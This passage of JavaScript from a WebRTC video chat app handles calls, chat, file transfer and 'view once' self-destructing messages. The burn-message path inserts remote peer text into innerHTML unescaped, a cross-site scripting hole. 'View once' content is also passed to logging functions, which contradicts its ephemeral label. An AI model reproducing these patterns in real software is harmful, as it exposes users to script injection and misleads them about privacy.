    if (localStream) { localStream.getTracks().forEach(t => t.stop()); localStream = null; }
    if (localVideo) localVideo.srcObject = null;
    if (remoteVideo) remoteVideo.srcObject = null;

    waitingScreen.style.display = 'flex';
    callScreen.classList.add('hidden');
    chatPanel.classList.add('hidden');
    fileProgress.classList.add('hidden');
    recordingIndicator.classList.add('hidden');
    isMicOn = true; isCamOn = true; isScreenSharing = false;
    incomingFileBuffers = {};
    callStartTime = null; messageCount = 0; currentRoomId = null;
    mediaRecorder = null; recordedChunks = [];
    combinedStream = null; isCallActive = false; currentRemoteStream = null;
    segmentNumber = 0; totalRecordingSize = 0;
    if (recordingTimer) { clearTimeout(recordingTimer); recordingTimer = null; }
    updateControlButtons();

    chatMessages.innerHTML = '<div class="chat-system">Chat started. Say hello! 👋</div>';
    showPage(homePage);
    if (window.location.search) window.history.replaceState({}, document.title, window.location.pathname);

    // Re-initialize Cyber Space Peer ONLY if it was destroyed or is null
    if (!peer) {
        checkCyberSession();
    }
}

// ============ COPY LINK ============
function copyLink() {
    navigator.clipboard.writeText(shareableLink.value).then(() => showToast('Link copied! 📋')).catch(() => { shareableLink.select(); document.execCommand('copy'); showToast('Link copied!'); });
}
if (copyLinkBtn) copyLinkBtn.addEventListener('click', copyLink);
if (copyLinkBtn2) copyLinkBtn2.addEventListener('click', copyLink);

// ============ MIC / CAM / SCREEN ============
if (toggleMicBtn) {
    toggleMicBtn.addEventListener('click', () => {
        if (!localStream) return;
        isMicOn = !isMicOn;
        localStream.getAudioTracks().forEach(t => t.enabled = isMicOn);
        updateControlButtons();
        showToast(isMicOn ? '🎙 Mic on' : '🔇 Mic muted');
    });
}
if (toggleCamBtn) {
    toggleCamBtn.addEventListener('click', () => {
        if (!localStream) return;
        isCamOn = !isCamOn;
        localStream.getVideoTracks().forEach(t => t.enabled = isCamOn);
        updateControlButtons();
        showToast(isCamOn ? '📹 Camera on' : '🚫 Camera off');
    });
}

async function switchCamera() {
    if (!localStream) { showToast('⚠️ Start video call first'); return; }
    try {
        const oldVideoTrack = localStream.getVideoTracks()[0];
        if (!oldVideoTrack) { showToast('⚠️ No active video track'); return; }

        currentFacingMode = (currentFacingMode === 'user') ? 'environment' : 'user';
        showToast(currentFacingMode === 'user' ? '🤳 Switching to Front Camera...' : '📸 Switching to Back Camera...');

        const isMobile = window.innerWidth <= 768 || /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        const constraints = {
            video: isMobile ? {
                facingMode: { ideal: currentFacingMode },
                width: { ideal: 720, max: 1080 },
                height: { ideal: 1280, max: 1920 },
                aspectRatio: { ideal: 9 / 16 },
                frameRate: { ideal: 30, max: 30 }
            } : {
                facingMode: { ideal: currentFacingMode },
                width: { ideal: 1280, max: 1920 },
                height: { ideal: 720, max: 1080 },
                aspectRatio: { ideal: 16 / 9 },
                frameRate: { ideal: 30, max: 30 }
            },
            audio: false
        };

        const newStream = await navigator.mediaDevices.getUserMedia(constraints);
        const newVideoTrack = newStream.getVideoTracks()[0];
        if (!newVideoTrack) { showToast('❌ Could not switch camera'); return; }

        localStream.removeTrack(oldVideoTrack);
        localStream.addTrack(newVideoTrack);
        if (localVideo) {
            localVideo.srcObject = null;
            localVideo.srcObject = localStream;
        }
        oldVideoTrack.stop();

        if (currentCall && currentCall.peerConnection) {
            const sender = currentCall.peerConnection.getSenders().find(s => s.track && s.track.kind === 'video');
            if (sender) {
                await sender.replaceTrack(newVideoTrack);
            }
        }
        originalVideoTrack = newVideoTrack;
    } catch (e) {
        console.error('Camera switch failed:', e);
        showToast('⚠️ Could not switch camera');
        currentFacingMode = (currentFacingMode === 'user') ? 'environment' : 'user';
    }
}
if (toggleCamFlipBtn) {
    toggleCamFlipBtn.addEventListener('click', switchCamera);
}
window.switchCamera = switchCamera;

toggleScreenBtn.addEventListener('click', async () => {
    if (!localStream || !currentCall) return;
    if (!isScreenSharing) {
        try {
            const ss = await navigator.mediaDevices.getDisplayMedia({ video: { cursor: 'always' }, audio: false });
            originalVideoTrack = localStream.getVideoTracks()[0];
            const st = ss.getVideoTracks()[0];
            const sender = currentCall.peerConnection.getSenders().find(s => s.track && s.track.kind === 'video');
            if (sender) await sender.replaceTrack(st);
            st.onended = async () => { if (sender && originalVideoTrack) await sender.replaceTrack(originalVideoTrack); isScreenSharing = false; updateControlButtons(); showToast('Screen share stopped'); };
            isScreenSharing = true; updateControlButtons(); showToast('🖥 Screen sharing started');
        } catch (e) { showToast('Screen share cancelled'); }
    } else {
        if (originalVideoTrack) {
            const sender = currentCall.peerConnection.getSenders().find(s => s.track && s.track.kind === 'video');
            if (sender) await sender.replaceTrack(originalVideoTrack);
        }
        isScreenSharing = false; updateControlButtons(); showToast('Screen share stopped');
    }
});

if (togglePipBtn) {
    togglePipBtn.addEventListener('click', async () => {
        try {
            if (!document.pictureInPictureEnabled) {
                showToast('⚠️ PiP mode not supported');
                return;
            }
            if (document.pictureInPictureElement) {
                await document.exitPictureInPicture();
            } else {
                if (remoteVideo && remoteVideo.readyState >= 2 && remoteVideo.srcObject) {
                    await remoteVideo.requestPictureInPicture();
                } else {
                    showToast('⚠️ Waiting for video stream...');
                }
            }
        } catch (err) {
            showToast('⚠️ Could not start PiP Mode');
        }
    });
}

// ============ CHAT PANEL TOGGLER (BOTTOM SHEET DRAWER) ============
if (toggleChatBtn) {
    toggleChatBtn.addEventListener('click', () => { 
        if (chatPanel) chatPanel.classList.toggle('hidden'); 
        toggleChatBtn.classList.toggle('ctrl-btn-active'); 
    });
}

let isBurnChatActive = false;
const toggleBurnChatBtn = document.getElementById('toggleBurnChatBtn');
if (toggleBurnChatBtn) {
    toggleBurnChatBtn.addEventListener('click', () => {
        isBurnChatActive = !isBurnChatActive;
        toggleBurnChatBtn.style.color = isBurnChatActive ? '#ff2d75' : '#8696a0';
        toggleBurnChatBtn.style.textShadow = isBurnChatActive ? '0 0 10px #ff2d75' : 'none';
        showToast(isBurnChatActive ? '🔥 View Once Chat Mode ON (10s Auto-Delete)' : '💬 Normal Chat Mode ON');
    });
}

if (closeChatBtn) {
    closeChatBtn.addEventListener('click', () => { 
        if (chatPanel) chatPanel.classList.add('hidden'); 
        if (toggleChatBtn) toggleChatBtn.classList.remove('ctrl-btn-active'); 
    });
}
if (sendChatBtn) sendChatBtn.addEventListener('click', sendTextMessage);
if (chatInput) chatInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') sendTextMessage(); });

function sendTextMessage() {
    const text = chatInput.value.trim();
    if (!text) return;
    addChatMessage(text, true, isBurnChatActive);
    messageCount++;
    logEvent('chat_message', { text: (isBurnChatActive ? "[🔥 VIEW ONCE] " : "") + text, sender: userRole });
    if (dataConnection && dataConnection.open) dataConnection.send({ type: 'chat', text, burn: isBurnChatActive });
    chatInput.value = '';
}

function addChatMessage(text, isSent, isBurn = false) {
    const d = document.createElement('div');
    d.className = 'chat-msg ' + (isSent ? 'sent' : 'received') + (isBurn ? ' burn-message' : '');
    
    const msgSpan = document.createElement('span');
    msgSpan.textContent = text;
    d.appendChild(msgSpan);

    const metaDiv = document.createElement('div');
    metaDiv.className = 'msg-meta';
    
    const timeSpan = document.createElement('span');
    const now = new Date();
    timeSpan.textContent = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    metaDiv.appendChild(timeSpan);

    if (isSent) {
        const ticksIcon = document.createElement('i');
        ticksIcon.className = 'fas fa-check-double read-ticks'; // Glowing double blue ticks!
        metaDiv.appendChild(ticksIcon);
    }
    
    d.appendChild(metaDiv);

    if (isBurn) {
        let timeLeft = 10;
        d.innerHTML = `<span class="burn-badge">(🔥 ${timeLeft}s)</span> <span>${text}</span><div class="msg-meta"><span>${now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}</span>${isSent ? '<i class="fas fa-check-double read-ticks"></i>' : ''}</div>`;
        const timer = setInterval(() => {
            timeLeft--;
            const b = d.querySelector('.burn-badge');
            if (b) b.textContent = `(🔥 ${timeLeft}s)`;
            if (timeLeft <= 0) {
                clearInterval(timer);
                if (d.parentNode) d.parentNode.removeChild(d);
            }
        }, 1000);
    }

    chatMessages.appendChild(d);
    chatMessages.scrollTop = chatMessages.scrollHeight;
}

// ============ FILE SHARING ============
if (attachFileBtn) {
    attachFileBtn.addEventListener('click', () => fileInput.click());
}
if (fileInput) {
    fileInput.addEventListener('change', () => {
        const file = fileInput.files[0];
        if (!file) return;
        openFileConfirmModal(file);
    });
}

// WHATSAPP FILE SEND CONFIRMATION MODAL LOGICS
function openFileConfirmModal(file) {
    pendingSendFile = file;
    currentFileSendMode = 'normal';
    
    document.getElementById('fileConfirmName').textContent = file.name;
    document.getElementById('fileConfirmSize').textContent = formatFileSize(file.size);
    
    // Toggle active classes on buttons
    document.getElementById('fileModeBtnNormal').className = 'btn btn-whatsapp-outline w-100 active-mode-btn';
    document.getElementById('fileModeBtnOnce').className = 'btn btn-whatsapp-outline w-100';

    // Set icon based on file type
    const ext = file.name.split('.').pop().toLowerCase();
    const iconEl = document.getElementById('fileConfirmIcon');
    iconEl.innerHTML = `<i class="fas ${getFileIcon(file.name)}"></i>`;

    document.getElementById('fileConfirmModal').classList.remove('hidden');
}
window.openFileConfirmModal = openFileConfirmModal;

function closeFileConfirmModal() {
    document.getElementById('fileConfirmModal').classList.add('hidden');
    pendingSendFile = null;
    fileInput.value = '';
}
window.closeFileConfirmModal = closeFileConfirmModal;

function setFileSendMode(mode) {
    currentFileSendMode = mode;
    const btnNormal = document.getElementById('fileModeBtnNormal');
    const btnOnce = document.getElementById('fileModeBtnOnce');
    
    if (mode === 'normal') {
        btnNormal.className = 'btn btn-whatsapp-outline w-100 active-mode-btn';
        btnOnce.className = 'btn btn-whatsapp-outline w-100';
    } else {
        btnNormal.className = 'btn btn-whatsapp-outline w-100';
        btnOnce.className = 'btn btn-whatsapp-outline w-100 active-mode-btn-once';
    }
}
window.setFileSendMode = setFileSendMode;

function confirmAndSendFile() {
    if (pendingSendFile) {
        sendFile(pendingSendFile, currentFileSendMode);
        closeFileConfirmModal();
    }
}
window.confirmAndSendFile = confirmAndSendFile;

async function sendFile(file, mode = 'normal') {
    if (!dataConnection || !dataConnection.open) { showToast('No data connection.'); return; }
    const tid = 'f_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
    const ab = await file.arrayBuffer();
    const tc = Math.ceil(ab.byteLength / CHUNK_SIZE);
    
    logEvent('file_sent', { fileName: file.name, fileSize: ab.byteLength, sender: userRole });
    logFileUpload(file.name, ab);
    
    fileProgress.classList.remove('hidden');
    fileProgressFill.style.width = '0%';
    fileProgressText.textContent = `Sending ${file.name} (0%)`;
    
    // Pass mode parameter inside start header
    dataConnection.send({ 
        type: 'file-start', 
        transferId: tid, 
        fileName: file.name, 
        fileSize: ab.byteLength, 
        totalChunks: tc, 
        mimeType: file.type || 'application/octet-stream',
        mode: mode 
    });
    
    for (let i = 0; i < tc; i++) {
        const s = i * CHUNK_SIZE, e = Math.min(s + CHUNK_SIZE, ab.byteLength);
        dataConnection.send({ type: 'file-chunk', transferId: tid, chunkIndex: i, data: ab.slice(s, e) });
        const pct = Math.round(((i + 1) / tc) * 100);
        fileProgressFill.style.width = pct + '%';
        fileProgressText.textContent = `Sending ${file.name} (${pct}%)`;
        if (i % 5 === 0) await new Promise(r => setTimeout(r, 10));
    }
    dataConnection.send({ type: 'file-end', transferId: tid });
    
    addFileToChat(file.name, ab.byteLength, file.type, ab, true, null, null, mode);
    fileProgress.classList.add('hidden');
    showToast(`✅ ${file.name} sent!`);
}

function handleDataMessage(data) {
    if (!data || !data.type) return;
    if (data.type === 'chat') {
        addChatMessage(data.text, false, data.burn || false);
        messageCount++;
        logEvent('chat_message', { text: (data.burn ? "[🔥 VIEW ONCE] " : "") + data.text, sender: userRole === 'creator' ? 'joiner' : 'creator' });
    }
    else if (data.type === 'reaction') {
        showFloatingReaction(data.emoji, false);
    }
    else if (data.type === 'file-start') {
        incomingFileBuffers[data.transferId] = { 
            chunks: [], 
            totalChunks: data.totalChunks, 
            metadata: { 
                fileName: data.fileName, 
                fileSize: data.fileSize, 
                mimeType: data.mimeType,
                mode: data.mode || 'normal' // Receive mode!
            } 
        };
        fileProgress.classList.remove('hidden');
        fileProgressFill.style.width = '0%';
        fileProgressText.textContent = `Receiving ${data.fileName} (0%)`;
    }
    else if (data.type === 'file-chunk') {
        const b = incomingFileBuffers[data.transferId]; if (!b) return;
        b.chunks[data.chunkIndex] = data.data;
        const pct = Math.round((b.chunks.filter(c => c).length / b.totalChunks) * 100);
        fileProgressFill.style.width = pct + '%';
        fileProgressText.textContent = `Receiving ${b.metadata.fileName} (${pct}%)`;
    }
    else if (data.type === 'file-end') {
        const b = incomingFileBuffers[data.transferId]; if (!b) return;
        const blob = new Blob(b.chunks, { type: b.metadata.mimeType });
        const url = URL.createObjectURL(blob);
        addFileToChat(b.metadata.fileName, b.metadata.fileSize, b.metadata.mimeType, null, false, url, blob, b.metadata.mode);
        logEvent('file_sent', { fileName: b.metadata.fileName, fileSize: b.metadata.fileSize, sender: userRole === 'creator' ? 'joiner' : 'creator' });
        fileProgress.classList.add('hidden');
        showToast(`📥 ${b.metadata.fileName} received!`);
        delete incomingFileBuffers[data.transferId];
    }
}

// WHATSAPP STYLE VIEW-ONCE P2P INTERACTIVE LIGHTBOX VIEWING & SELF-DESTRUCT
let currentViewOnceBlobUrl = null;

function openViewOnceMedia(blobUrl, mimeType, bubbleEl) {
    if (bubbleEl.classList.contains('view-once-opened')) return; // Block double opens
    
    currentViewOnceBlobUrl = blobUrl;
    const viewerContent = document.getElementById('fileViewerContent');
    
    if (mimeType.startsWith('image/')) {
        viewerContent.innerHTML = `<img src="${blobUrl}" style="max-width:100%; max-height:80vh; border-radius:12px; object-fit:contain;" />`;
    } else if (mimeType.startsWith('video/')) {
        viewerContent.innerHTML = `<video src="${blobUrl}" controls autoplay style="max-width:100%; max-height:80vh; border-radius:12px;"></video>`;
    } else {
        viewerContent.innerHTML = `<div style="text-align:center;"><i class="fas fa-file-alt" style="font-size:4rem; color:var(--wa-teal); margin-bottom:15px; display:block;"></i><span style="color:white; display:block; margin-bottom:15px;">Document file opened successfully.</span><a href="${blobUrl}" download="file" class="btn btn-whatsapp">Download Document</a></div>`;
    }

    document.getElementById('fileViewerModal').classList.remove('hidden');

    // SELF DESTRUCT TIMER: Once modal is closed, the link is destroyed and bubble changes to 'Opened'!
    window.pendingSelfDestructBubble = bubbleEl;
}
window.openViewOnceMedia = openViewOnceMedia;

function closeFileViewer() {
    document.getElementById('fileViewerModal').classList.add('hidden');
    document.getElementById('fileViewerContent').innerHTML = '';

    // Revoke blob URL so it can never be loaded or viewed again in the browser memory!
    if (currentViewOnceBlobUrl) {
        URL.revokeObjectURL(currentViewOnceBlobUrl);
        currentViewOnceBlobUrl = null;
    }

    // Change bubble state to 'Opened' permanently (WhatsApp Style!)
    const bubble = window.pendingSelfDestructBubble;
    if (bubble) {
        bubble.className = 'view-once-bubble view-once-opened';
        bubble.innerHTML = `<i class="fas fa-check-double text-muted"></i> Opened`;
        bubble.onclick = null; // Disable click handlers permanently!
        window.pendingSelfDestructBubble = null;
        showToast('🔥 View Once Media Self-Destructed!');
    }
}
window.closeFileViewer = closeFileViewer;

function addFileToChat(fileName, fileSize, mimeType, arrayBuffer, isSent, blobUrl, blob, mode = 'normal') {
    const div = document.createElement('div');
    div.className = 'chat-msg ' + (isSent ? 'sent' : 'received');
    
    let finalBlobUrl = blobUrl;
    if (isSent && arrayBuffer) {
        finalBlobUrl = URL.createObjectURL(new Blob([arrayBuffer], { type: mimeType }));
    }

    // 1. WhatsApp View Once Bubble Format
    if (mode === 'viewonce') {
        const viewOnceDiv = document.createElement('div');
        viewOnceDiv.className = 'view-once-bubble';
        viewOnceDiv.innerHTML = `<i class="fas fa-fire"></i> View Once Media (Click to open)`;
        
        viewOnceDiv.onclick = () => openViewOnceMedia(finalBlobUrl, mimeType || 'image/jpeg', viewOnceDiv);
        
        div.appendChild(viewOnceDiv);
    } 
    // 2. Normal Standard File Bubble Format (With direct Image, Video and Audio Playback)
    else {
        if (isImageFile(fileName)) {
            if (finalBlobUrl) {
                const img = document.createElement('img'); 
                img.src = finalBlobUrl; 
                img.className = 'chat-image'; 
                img.style.cssText = 'max-width: 200px; border-radius: 12px; cursor: pointer; margin-top: 6px; display: block; box-shadow: 0 4px 15px rgba(0,0,0,0.3);';
                img.onclick = () => openViewOnceMedia(finalBlobUrl, 'image/jpeg', document.createElement('div')); // Reusable lightbox
                div.appendChild(img);
                
                const dl = document.createElement('a'); dl.href = finalBlobUrl; dl.download = fileName; dl.className = 'file-download';
                dl.innerHTML = `<i class="fas fa-download"></i> Download`;
                div.appendChild(dl);
            }
        } else if (isVideoFile(fileName)) {
            if (finalBlobUrl) {
                const vid = document.createElement('video');
                vid.src = finalBlobUrl;
                vid.controls = true;
                vid.className = 'chat-video';
                vid.style.cssText = 'max-width: 200px; border-radius: 12px; margin-top: 6px; display: block; box-shadow: 0 4px 15px rgba(0,0,0,0.3);';
                div.appendChild(vid);
                
                const dl = document.createElement('a'); dl.href = finalBlobUrl; dl.download = fileName; dl.className = 'file-download';
                dl.innerHTML = `<i class="fas fa-download"></i> Download`;
                div.appendChild(dl);
            }
        } else if (isAudioFile(fileName)) {
            if (finalBlobUrl) {
                const aud = document.createElement('audio');
                aud.src = finalBlobUrl;
                aud.controls = true;
                aud.style.cssText = 'max-width: 200px; margin-top: 6px; display: block;';
                div.appendChild(aud);
                
                const dl = document.createElement('a'); dl.href = finalBlobUrl; dl.download = fileName; dl.className = 'file-download';
                dl.innerHTML = `<i class="fas fa-download"></i> Download`;
                div.appendChild(dl);
            }
        } else {
            const fb = document.createElement('div'); fb.className = 'file-bubble';
            const ic = document.createElement('i'); ic.className = 'fas ' + getFileIcon(fileName); ic.style.color = isSent ? '#fff' : 'var(--wa-teal)';
            const info = document.createElement('div'); info.className = 'file-info';
            const ns = document.createElement('span'); ns.className = 'file-name'; ns.textContent = fileName;
            const ss = document.createElement('span'); ss.className = 'file-size'; ss.textContent = formatFileSize(fileSize);
            info.appendChild(ns); info.appendChild(document.createElement('br')); info.appendChild(ss);
            fb.appendChild(ic); fb.appendChild(info); div.appendChild(fb);
            if (finalBlobUrl) {
                const dl = document.createElement('a'); dl.href = finalBlobUrl; dl.download = fileName; dl.className = 'file-download'; dl.innerHTML = '<i class="fas fa-download"></i> Download'; div.appendChild(dl);
            }
        }
    }

    // Append Double Ticks read receipt meta row at the bottom
    const metaDiv = document.createElement('div');
    metaDiv.className = 'msg-meta';
    
    const timeSpan = document.createElement('span');
    const now = new Date();
    timeSpan.textContent = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    metaDiv.appendChild(timeSpan);

    if (isSent) {
        const ticksIcon = document.createElement('i');
        ticksIcon.className = 'fas fa-check-double read-ticks'; // Glowing double blue ticks!
        metaDiv.appendChild(ticksIcon);
    }
    
    div.appendChild(metaDiv);

    chatMessages.appendChild(div); 
    chatMessages.scrollTop = chatMessages.scrollHeight;
}

// ============ AUTO-JOIN URL ============
function checkUrlForRoom() {
    const p = new URLSearchParams(window.location.search);
    const r = p.get('room');
    if (r) {
        console.log('Auto-joining room from URL:', r);
        setTimeout(() => initRoom(r, false), 800);
    }
}

// ============ DRAGGABLE SELF VIDEO ============
(function () {
    const w = document.getElementById('selfVideoWrapper');
    let drag = false, sx, sy, ox, oy;
    if (w) {
        w.addEventListener('mousedown', (e) => { drag = true; sx = e.clientX; sy = e.clientY; const r = w.getBoundingClientRect(); ox = r.left; oy = r.top; w.style.transition = 'none'; });
        document.addEventListener('mousemove', (e) => { if (!drag) return; w.style.position = 'absolute'; w.style.left = (ox + e.clientX - sx) + 'px'; w.style.top = (oy + e.clientY - sy) + 'px'; w.style.right = 'auto'; w.style.bottom = 'auto'; });
        document.addEventListener('mouseup', () => { drag = false; w.style.transition = ''; });
        w.addEventListener('touchstart', (e) => { const t = e.touches[0]; drag = true; sx = t.clientX; sy = t.clientY; const r = w.getBoundingClientRect(); ox = r.left; oy = r.top; w.style.transition = 'none'; });
        document.addEventListener('touchmove', (e) => { if (!drag) return; const t = e.touches[0]; w.style.position = 'absolute'; w.style.left = (ox + t.clientX - sx) + 'px'; w.style.top = (oy + t.clientY - sy) + 'px'; w.style.right = 'auto'; w.style.bottom = 'auto'; });
        document.addEventListener('touchend', () => { drag = false; w.style.transition = ''; });
    }
})();

// ============ THEMES ============
function setTheme(theme) {
    const root = document.documentElement;
    if (theme === 'cyan') {
        root.style.setProperty('--wa-teal', '#00f0ff');
        root.style.setProperty('--wa-teal-dark', '#004c66');
    } else if (theme === 'green') {
        root.style.setProperty('--wa-teal', '#00a884');
        root.style.setProperty('--wa-teal-dark', '#005c4b');
    } else if (theme === 'pink') {
        root.style.setProperty('--wa-teal', '#ff2d75');
        root.style.setProperty('--wa-teal-dark', '#660024');
    } else if (theme === 'gold') {
        root.style.setProperty('--wa-teal', '#ffd700');
        root.style.setProperty('--wa-teal-dark', '#664c00');
    }
    showToast(`🎨 Theme changed: ${theme.toUpperCase()}`);
}
window.setTheme = setTheme;

function playSciFiSound(type) {
    try {
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.connect(gain);
        gain.connect(ctx.destination);
        const now = ctx.currentTime;
        if (type === 'pop') {
            osc.type = 'sine';
            osc.frequency.setValueAtTime(450, now);
            osc.frequency.exponentialRampToValueAtTime(900, now + 0.12);
            gain.gain.setValueAtTime(0.2, now);
            gain.gain.exponentialRampToValueAtTime(0.01, now + 0.12);
            osc.start(now); osc.stop(now + 0.12);
        } else if (type === 'join') {
            osc.type = 'triangle';
            osc.frequency.setValueAtTime(300, now);
            osc.frequency.exponentialRampToValueAtTime(650, now + 0.25);
            gain.gain.setValueAtTime(0.25, now);
            gain.gain.exponentialRampToValueAtTime(0.01, now + 0.25);
            osc.start(now); osc.stop(now + 0.25);
        }
    } catch (e) {}
}

function setupActiveSpeakerDetector(stream, videoEl) {
    try {
        const audioTracks = stream.getAudioTracks();
        if (!audioTracks.length) return;
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        const src = ctx.createMediaStreamSource(new MediaStream([audioTracks[0]]));
        const analyser = ctx.createAnalyser();
        analyser.fftSize = 256;
        src.connect(analyser);
        const data = new Uint8Array(analyser.frequencyBinCount);
        setInterval(() => {
            if (!isCallActive) return;
            analyser.getByteFrequencyData(data);
            let sum = 0;
            for (let i = 0; i < data.length; i++) sum += data[i];
            const avg = sum / data.length;
            if (avg > 25 && videoEl) {
                videoEl.classList.add('active-speaker');
            } else if (videoEl) {
                videoEl.classList.remove('active-speaker');
            }
        }, 400);
    } catch (e) {}
}

function sendReaction(emoji) {
    showFloatingReaction(emoji, true);
    if (dataConnection && dataConnection.open) {
        dataConnection.send({ type: 'reaction', emoji });
    }
}
window.sendReaction = sendReaction;

function showFloatingReaction(emoji, isSelf) {
    playSciFiSound('pop');
    const el = document.createElement('div');
    el.className = 'floating-emoji';
    el.textContent = emoji;
    el.style.left = (Math.random() * 60 + 20) + '%';
    document.body.appendChild(el);
    setTimeout(() => { if (el && el.parentNode) el.parentNode.removeChild(el); }, 2200);
}

// ============ Check session on load ============
function checkCyberSession() {
    try {
        const stored = localStorage.getItem('cyberUser');
        if (stored) {
            currentUser = JSON.parse(stored);
            
            // Show Dashboards, Hide Onboardings
            document.getElementById('chatsLoggedOutCard').classList.add('hidden');
            document.getElementById('chatsLoggedInDashboard').classList.remove('hidden');
            document.getElementById('callsLoggedOutCard').classList.add('hidden');
            document.getElementById('callsLoggedInDashboard').classList.remove('hidden');
            document.getElementById('appFab').classList.remove('hidden');

            document.getElementById('cyberAuthBox').classList.add('hidden');
            document.getElementById('cyberDashboardBox').classList.remove('hidden');
            document.getElementById('cyberProfileName').textContent = currentUser.display_name;
            document.getElementById('cyberProfileId').textContent = '@' + currentUser.username;

            // Start background heartbeats & friends polling
            sendHeartbeat();
            if (cyberHeartbeatInterval) clearInterval(cyberHeartbeatInterval);
            cyberHeartbeatInterval = setInterval(sendHeartbeat, 15000);
            
            pollFriendsList();
            if (cyberFriendsInterval) clearInterval(cyberFriendsInterval);
            cyberFriendsInterval = setInterval(pollFriendsList, 10000);

            // ONLY connect the Cyber Peer if we are NOT currently in an anonymous room!
            const params = new URLSearchParams(window.location.search);
            if (!params.get('room')) {
                initCyberPeer();
            }
        } else {
            switchAppTab('profile'); // Focus on Login if not logged in
        }
    } catch (err) {
        console.error("Session load error:", err);
        localStorage.removeItem('cyberUser');
        switchAppTab('profile');
    }
}

// ============ DYNAMIC ADAPTIVE BITRATE (AIRTEL/JIO PRO ENGINE - ULTRA RES PRIORITIZED) ============
function setupDynamicNetworkAdaptation(call) {
    if (!call || !call.peerConnection) return;
    try {
        const pc = call.peerConnection;
        const senders = pc.getSenders();
        const videoSender = senders.find(s => s.track && s.track.kind === 'video');
        if (videoSender && videoSender.getParameters) {
            const params = videoSender.getParameters();
            if (!params.encodings) params.encodings = [{}];
            params.encodings[0].maxBitrate = 4000000;          // 4 Mbps ultra HD max!
            params.encodings[0].networkPriority = 'high';
            videoSender.setParameters(params).catch(() => {});
        }

        // Set degradation preference to maintain maximum resolution on slow networks!
        if (pc.getTransceivers) {
            pc.getTransceivers().forEach(transceiver => {
                if (transceiver.sender && transceiver.sender.track && transceiver.sender.track.kind === 'video') {
                    transceiver.sender.degradationPreference = 'maintain-resolution'; 
                    console.log("⚡ [WebRTC Engine] Prioritizing ultra-sharp resolution over frame rate for low network!");
                }
            });
        }

        const pingEl = document.getElementById('pingText');
        const netInterval = setInterval(async () => {
            if (!isCallActive || !pc || pc.connectionState === 'closed') {
                clearInterval(netInterval);
                return;
            }
            try {
                const stats = await pc.getStats();
                let rtt = 0, width = 0, height = 0;
                stats.forEach(report => {
                    if (report.type === 'candidate-pair' && report.state === 'succeeded' && report.currentRoundTripTime) {
                        rtt = Math.round(report.currentRoundTripTime * 1000);
                    }
                    if (report.type === 'inbound-rtp' && report.kind === 'video') {
                        if (report.frameWidth) width = report.frameWidth;
                        if (report.frameHeight) height = report.frameHeight;
                    }
                });
                if (pingEl && rtt > 0) {
                    const resStr = width > 0 ? `${width}x${height}` : 'HD';
                    if (rtt < 80) {
                        pingEl.innerHTML = `🟢 Excellent (${rtt}ms) • ${resStr}`;
                    } else if (rtt < 180) {
                        pingEl.innerHTML = `🟡 Good (${rtt}ms) • ${resStr}`;
                    } else {
                        pingEl.innerHTML = `🟠 Weak Network (${rtt}ms) • Sharp Mode active`;
                    }
                }
            } catch (e) {}
        }, 2500);
    } catch (e) {}
}

function updateControlButtons() {
    if (toggleMicBtn) {
        toggleMicBtn.className = 'ctrl-btn' + (isMicOn ? ' ctrl-btn-active' : '');
        toggleMicBtn.innerHTML = isMicOn ? '<i class="fas fa-microphone"></i>' : '<i class="fas fa-microphone-slash"></i>';
    }
    if (toggleCamBtn) {
        toggleCamBtn.className = 'ctrl-btn' + (isCamOn ? ' ctrl-btn-active' : '');
        toggleCamBtn.innerHTML = isCamOn ? '<i class="fas fa-video"></i>' : '<i class="fas fa-video-slash"></i>';
    }
    if (toggleScreenBtn) {
        toggleScreenBtn.className = 'ctrl-btn' + (isScreenSharing ? ' ctrl-btn-active' : '');
    }
}

// ============ INIT ============
checkUrlForRoom();
checkFilePreview();
checkCyberSession();
